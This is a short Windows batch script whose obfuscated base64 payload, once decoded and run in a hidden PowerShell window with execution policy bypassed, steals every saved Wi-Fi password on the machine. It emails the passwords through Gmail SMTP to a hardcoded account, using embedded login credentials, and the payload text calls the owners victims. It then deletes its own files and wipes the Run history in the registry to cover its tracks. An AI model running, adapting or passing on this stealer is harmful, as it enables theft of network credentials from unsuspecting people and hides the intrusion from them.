echo bmV0c2ggd2xhbiBleHBvcnQgcHJvZmlsZSBrZXk9Y2xlYXIKCmVjaG8gIldpZmkgUGFzc3dvcmQgRXh0cmFjdG9yIENvZGVkIEJ5IEV4cGxvaXRlY2giID4gd2lmaXBhc3MudHh0CmRpciAqLnhtbCB8JSB7CiR4bWw9W3htbF0gKGdldC1jb250ZW50ICRfKQokYT0gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1gcmBuIFNTSUQgPSAiKyR4bWwuV0xBTlByb2ZpbGUuU1NJRENvbmZpZy5TU0lELm5hbWUgKyAiYHJgbiBQQVNTID0gIiArJHhtbC5XTEFOUHJvZmlsZS5NU00uU2VjdXJpdHkuc2hhcmVkS2V5LmtleW1hdGVyaWFsCgpPdXQtRmlsZSB3aWZpcGFzcy50eHQgLUFwcGVuZCAtSW5wdXRPYmplY3QgJGEKCn0KCgokU01UUFNlcnZlciA9ICdzbXRwLmdtYWlsLmNvbScKCgogICRTTVRQSW5mbyA9IE5ldy1PYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkU210cFNlcnZlciwgNTg3KQoKCiAgJFNNVFBJbmZvLkVuYWJsZVNzbCA9ICR0cnVlCgoKICAkU01UUEluZm8uQ3JlZGVudGlhbHMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoJ2xvZ2RlbTEyMzRAZ21haWwuY29tJywgJ2tleWxvZ3M5ODc2NTQzMjEnKQoKCiAgJFJlcG9ydEVtYWlsID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lk1haWwuTWFpbE1lc3NhZ2UKCgogICRSZXBvcnRFbWFpbC5Gcm9tID0gJ2xvZ2RlbTEyMzRAZ21haWwuY29tJwoKCiAgJFJlcG9ydEVtYWlsLlRvLkFkZCgnbG9nZGVtMTIzNEBnbWFpbC5jb20nKQoKCiAgJFJlcG9ydEVtYWlsLlN1YmplY3QgPSAnV0lGSSBQYXNzIFJlcG9ydCBvZiAnICsgJGVudjpVc2VyTmFtZQoKCiAgJFJlcG9ydEVtYWlsLkJvZHkgPSAnQXR0YWNoZWQgaXMgeW91ciB2aWN0aW0gV0lGSSBQYXNzd29yZHMnCgoKICAkUmVwb3J0RW1haWwuQXR0YWNobWVudHMuQWRkKCd3aWZpcGFzcy50eHQnKQoKCiAgJFNNVFBJbmZvLlNlbmQoJFJlcG9ydEVtYWlsKQoKcm0gKi54bWwgLUZvcmNlCnJtIHcudHh0IC1Gb3JjZQpybSB3LlBTMSAtRm9yY2UKUmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcUnVuTVJVJyAtTmFtZSAnKicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUK > w.txt
certutil -decode w.txt w.PS1
powershell  -windowstyle hidden -ExecutionPolicy ByPass  -File w.PS1